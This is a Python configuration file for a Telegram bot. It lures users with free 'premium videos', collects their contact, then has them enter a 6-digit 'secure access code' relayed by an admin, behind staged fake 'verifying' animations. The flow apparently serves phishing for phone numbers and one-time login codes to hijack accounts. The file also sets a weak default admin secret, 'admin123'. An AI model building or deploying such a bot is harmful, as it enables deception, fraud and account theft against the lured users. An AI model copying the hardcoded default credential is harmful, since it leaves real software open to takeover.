import os
from dotenv import load_dotenv

load_dotenv()

# Bot Configuration
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHAT_ID_RAW = os.getenv("ADMIN_CHAT_ID", "")
# Clean the ID: remove spaces, quotes, etc.
ADMIN_CHAT_ID = ADMIN_CHAT_ID_RAW.strip().replace('"', '').replace("'", "")

# Premium Branding
WELCOME_IMAGE_URL = os.getenv("WELCOME_IMAGE_URL", "https://via.placeholder.com/800x400?text=Premium+Verification") # Replace with real URL
WELCOME_CAPTION = (
    "✨ *Premium Verification System*\n\n"
    "All premium videos available for free.\n"
    "सभी premium videos मुफ्त में available है।\n\n"
    "Please click the button below to proceed automatically."
)

# Animated Messages
SUBMITTING_MSGS = ["Submitting.", "Submitting..", "Submitting..."]
VERIFYING_MSGS = ["Verifying Access.", "Verifying Access..", "Verifying Access..."]
WAITING_CODE_MSGS = ["Waiting for Secure Code.", "Waiting for Secure Code..", "Waiting for Secure Code..."]
CHECKING_CODE_MSGS = ["Checking Code.", "Checking Code..", "Checking Code..."]
CONFIRMING_MSGS = ["Confirming Approval.", "Confirming Approval..", "Confirming Approval..."]

# Success/Failure Messages
ACCESS_GRANTED_MSG = "✅ *Access Verified*\n\nSecure Access Granted. Enjoy your premium features!"
INVALID_CODE_MSG = "❌ *Invalid Access Code*\n\nPlease try again or contact support."
WAITING_FOR_ADMIN_MSG = "📩 A secure access code will be sent shortly by the admin."
ENTER_CODE_MSG = "⌨️ *Enter Access Code*\n\nPlease use the buttons below to enter the 6-digit code."

# Admin Secret Key
ADMIN_SECRET = os.getenv("ADMIN_SECRET", "admin123")

# States
(
    START,
    AWAITING_CONTACT,
    AWAITING_CODE,
    ADMIN_CONFIRMATION,
    ADMIN_AUTH,
    ADMIN_PANEL,
    UPLOAD_FILE,
    SET_COOLDOWN,
    SET_AUTO_DELETE,
    RENAME_FILE,
    BROADCAST_SEND,
    EDIT_WELCOME_IMG,
    EDIT_WELCOME_CAPTION
) = range(13)
